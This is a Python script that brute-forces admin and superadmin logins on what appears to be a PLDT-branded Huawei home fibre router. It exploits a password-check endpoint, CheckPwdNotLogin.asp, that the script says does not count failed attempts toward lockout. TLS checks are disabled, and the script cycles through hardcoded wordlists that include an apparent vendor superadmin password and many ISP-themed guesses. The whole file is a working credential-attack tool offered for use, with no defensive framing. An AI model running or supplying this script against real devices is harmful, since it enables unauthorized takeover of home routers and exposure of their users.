#!/usr/bin/env python3
"""
Brute-force the admin password via CheckPwdNotLogin.asp
This endpoint does NOT trigger lockout (LoginTimes not incremented).
Returns: 0 = wrong, 1 = normal admin, 2 = superadmin.
"""
import urllib.request
import urllib.parse
import ssl
import sys
import time

ROUTER = "https://192.168.1.1"
ENDPOINT = "/asp/CheckPwdNotLogin.asp?&1=1"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE


def check_password(username, password):
    """Returns the CheckPassword result: 0=wrong, 1=admin, 2=superadmin"""
    data = urllib.parse.urlencode({
        "UserNameInfo": username,
        "NormalPwdInfo": password,
    }).encode()
    req = urllib.request.Request(
        f"{ROUTER}{ENDPOINT}",
        data=data,
        method="POST",
        headers={
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    try:
        resp = urllib.request.urlopen(req, context=ctx, timeout=5)
        body = resp.read().decode("utf-8", errors="replace").strip()
        return body
    except Exception as e:
        return f"ERROR:{e}"


def check_password_encoded(username, password):
    """Try with base64-encoded password"""
    import base64
    pw_b64 = base64.b64encode(password.encode()).decode()
    data = urllib.parse.urlencode({
        "UserNameInfo": username,
        "NormalPwdInfo": pw_b64,
    }).encode()
    req = urllib.request.Request(
        f"{ROUTER}{ENDPOINT}",
        data=data,
        method="POST",
        headers={
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    try:
        resp = urllib.request.urlopen(req, context=ctx, timeout=5)
        body = resp.read().decode("utf-8", errors="replace").strip()
        return body
    except Exception as e:
        return f"ERROR:{e}"


def main():
    print(f"\n{'='*60}")
    print("  CheckPwdNotLogin.asp Password Tester")
    print("  No lockout — safe to test many passwords")
    print(f"{'='*60}\n")

    # First, establish baseline
    print("[Baseline] Testing known values...\n")
    tests = [
        ("admin", "wrong"),
        ("admin", "Admin1234"),
        ("admin", "admin"),
        ("admin", "1234"),
        ("adminpldt", "wrong"),
        ("adminpldt", "z6dtnxg3ocz4"),
        ("adminpldt", "adminpldt"),
    ]
    for user, pwd in tests:
        result = check_password(user, pwd)
        result_b64 = check_password_encoded(user, pwd)
        print(f"  {user:12s}:{pwd:20s} -> raw=[{result}] b64=[{result_b64}]")

    # Now try comprehensive password lists for adminpldt
    print(f"\n{'='*60}")
    print("  Testing adminpldt credentials...")
    print(f"{'='*60}\n")

    pldt_superadmin_pwds = [
        "z6dtnxg3ocz4",
        "adminpldt",
        "PLDThomefibr@123",
        "PLDThomefibr@2023",
        "pldthomefibr@123",
        "pldthomefibr@2023",
        "PLDT@fibr",
        "pldt@fibr",
        "Fibr@1234",
        "fibr@1234",
        "PLDTHomeFibr",
        "PLDThomefibr",
        "pldthomefibr",
        "PLDThomeFibr@2024",
        "PLDThomeFibr@2025",
        "PLDT12345678",
        "pldt12345678",
        "PLDTpass",
        "pldtpass",
        "PLDT@1234",
        "pldt@1234",
        "password",
        "1234567890",
        "123456789",
        "12345678",
        "fibr1234",
        "Fibr1234",
        "PLDThome123",
        "PLDThome1",
        "pldthome1",
        "PLDThomeFibr@1",
        "PLDThomefibr!",
        "PLDT!@#$%^",
        "admin123",
        "Admin@123",
        "P@ssw0rd",
        "Hg@12345",
        "HG@12345",
        "PLDThome@123",
        "PLDThome@Fibr",
        "pldthome@fibr",
        "PLDTHOMEFIBR",
        "pldthomefibr123",
        "PLDTHomeFibr123",
        "Fibr@PLDT",
        "Fibr@pldt",
        "fibr@pldt",
        "pldt12345",
        "PLDT12345",
        "PLDThomefibr123",
        "p@ssw0rd",
        "PLDThomeFibr@",
        "PLDThomefibr@",
        "admin@pldt",
        "Admin@pldt",
        "PLDTAdmin",
        "pldtadmin",
        "PLDTAdmin123",
        "fibr",
        "FIBR",
        "Fibr",
        "PLDThomeFIBR",
        "pldthomeFIBR",
        "PlDtHoMeFiBr",
        "Z6dtnxg3ocz4",
        "Z6DTNXG3OCZ4",
    ]

    found = False
    for i, pwd in enumerate(pldt_superadmin_pwds, 1):
        result = check_password("adminpldt", pwd)
        if result and result != "0" and result != "" and "ERROR" not in result:
            print(f"  *** FOUND: adminpldt:{pwd} -> result=[{result}] ***")
            found = True
            break
        if i % 10 == 0:
            print(f"  ... tested {i}/{len(pldt_superadmin_pwds)} ...")
    
    if not found:
        print(f"\n  No adminpldt credentials found in list.")

    # Now try comprehensive password lists for admin
    print(f"\n{'='*60}")
    print("  Testing admin credentials...")
    print(f"{'='*60}\n")

    admin_pwds = [
        "Admin1234",
        "admin1234",
        "1234",
        "admin",
        "password",
        "12345678",
        "1234567890",
        "PLDT1234",
        "pldt1234",
        "PlDt1234",
        "PLDThome",
        "pldthome",
        "Fibr1234",
        "fibr1234",
        "PLDTHomeFibr",
        "pldthomefibr",
        "Admin@123",
        "admin@123",
        "Admin#123",
        "P@ssw0rd",
        "p@ssw0rd",
        "Huawei@123",
        "huawei123",
        "HUAWEI123",
        "HG8145X6",
        "hg8145x6",
        "PLDT12345",
        "pldt12345",
        "Home1234",
        "home1234",
        "pldthomefiber",
        "PLDTHomeFiber",
        "PLDThomeFibr",
        "pldthomefibr",
        "PLDThomefibr@123",
        "Fibr@1234",
        "fibr@1234",
        "PLDT@1234",
        "pldt@1234",
        "1234Admin",
        "PLDThome1",
        "pldthome1",
        "PLDThomefibr@2024",
        "PLDThomefibr@2025",
        "PLDThomefibr@2023",
    ]

    for i, pwd in enumerate(admin_pwds, 1):
        result = check_password("admin", pwd)
        if result and result != "" and result != "0" and "ERROR" not in result:
            print(f"  *** FOUND: admin:{pwd} -> result=[{result}] ***")
            found = True
            break
        if i % 10 == 0:
            print(f"  ... tested {i}/{len(admin_pwds)} ...")

    if not found:
        print(f"\n  No admin credentials found in list.")

    # Try 8-char passwords (var pwdLen = '8')
    print(f"\n{'='*60}")
    print("  Testing 8-char common passwords (var pwdLen = '8')...")
    print(f"{'='*60}\n")

    eight_char = [
        "password", "12345678", "qwerty12", "admin123", "welcome1",
        "letmein1", "monkey12", "dragon12", "master12", "login123",
        "abc12345", "pass1234", "1234qwer", "qwer1234", "1q2w3e4r",
        "P@ssw0rd", "12345678", "password", "12345678", "qwerty12",
        "changeme", "changeme1", "temp1234", "test1234", "admin123",
        "passw0rd", "p@ssword", "p@ss1234", "abc12345", "xyz12345",
        "admin01", "user0001", "1234abcd", "abcd1234", "1qaz2wsx",
        "1q2w3e4r", "1234!@#$", "!@#$%^&*", "P@ss1234", "Pass1234",
        "Admin123", "Adm1n123", "R0uter12", "router12", "PlDTH0me",
        "pldth0me", "F1br@123", "f1br@123", "H0me1234", "h0me1234",
    ]

    for i, pwd in enumerate(eight_char, 1):
        for user in ["admin", "adminpldt"]:
            result = check_password(user, pwd)
            if result and result != "" and result != "0" and "ERROR" not in result:
                print(f"  *** FOUND: {user}:{pwd} -> result=[{result}] ***")
                found = True
                break
        if found:
            break
        if i % 10 == 0:
            print(f"  ... tested {i*2}/{len(eight_char)*2} ...")

    if not found:
        print(f"\n  No 8-char credentials found.")

    print(f"\n{'='*60}")
    print("  Done.")
    print(f"{'='*60}\n")


if __name__ == "__main__":
    main()
